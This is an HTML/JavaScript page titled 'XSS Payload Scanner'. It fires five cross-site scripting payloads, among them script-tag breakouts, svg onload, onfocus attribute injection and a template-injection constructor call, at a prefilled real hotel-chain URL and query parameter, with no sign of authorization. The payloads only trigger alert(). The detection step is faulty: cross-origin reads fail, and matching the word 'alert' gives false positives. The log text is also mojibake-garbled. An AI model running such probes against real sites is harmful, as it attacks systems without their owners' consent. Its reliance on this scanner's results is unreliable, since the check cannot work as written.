<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>XSS Payload Scanner</title>
  <style>
    body { font-family: monospace; padding: 1rem; background: #111; color: #eee; }
    input, button { padding: 0.5rem; font-family: monospace; margin-right: 0.5rem; }
    iframe { width: 100%; height: 200px; margin-top: 1rem; border: 1px solid #555; display: none; }
    .log { margin-top: 1rem; white-space: pre-wrap; background: #222; padding: 1rem; border: 1px solid #444; }
  </style>
</head>
<body>
  <h2>XSS Payload Scanner</h2>
  <label>Base URL: <input type="text" id="baseUrl" size="80" value="https://www.marriott.com/hsia/internetConnection.mi"></label><br><br>
  <label>Param Name: <input type="text" id="paramName" value="SCREEN_ID"></label><br><br>
  <button onclick="runScan()">Run Scan</button>

  <iframe id="testFrame"></iframe>
  <div class="log" id="log"></div>

  <script>
    const payloads = [
      `\"><script>alert('XSS1')</script>`,
      `{{constructor.constructor('alert(\"XSS2\")')()}}`,
      `\"><svg/onload=alert(\"XSS3\")>`,
      `\" autofocus onfocus=alert('XSS4') x=\"`,
      `<iframe srcdoc=\"<script>alert('XSS5')</script>\"></iframe>`
    ];

    async function runScan() {
      const baseUrl = document.getElementById('baseUrl').value.trim();
      const paramName = document.getElementById('paramName').value.trim();
      const iframe = document.getElementById('testFrame');
      const logEl = document.getElementById('log');

      logEl.textContent = 'Running scan...\n';

      for (let payload of payloads) {
        const url = `${baseUrl}?${paramName}=${encodeURIComponent(payload)}`;
        logEl.textContent += `\nüîç Testing: ${url}`;

        iframe.src = url;
        iframe.style.display = 'block';

        await new Promise(resolve => setTimeout(resolve, 4000));

        try {
          const doc = iframe.contentDocument || iframe.contentWindow.document;
          const html = doc.documentElement.innerHTML;

          if (html.includes(payload) || html.includes("alert") || html.includes("constructor")) {
            logEl.textContent += `\nüö® Potential XSS found with payload: ${payload}`;
          } else {
            logEl.textContent += `\n‚úÖ No reflection for payload.`;
          }
        } catch (err) {
          logEl.textContent += `\n‚ùå Cross-origin restriction or error.`;
        }
      }

      iframe.style.display = 'none';
      logEl.textContent += '\n\n‚úÖ Scan complete.';
    }
  </script>
</body>
</html>
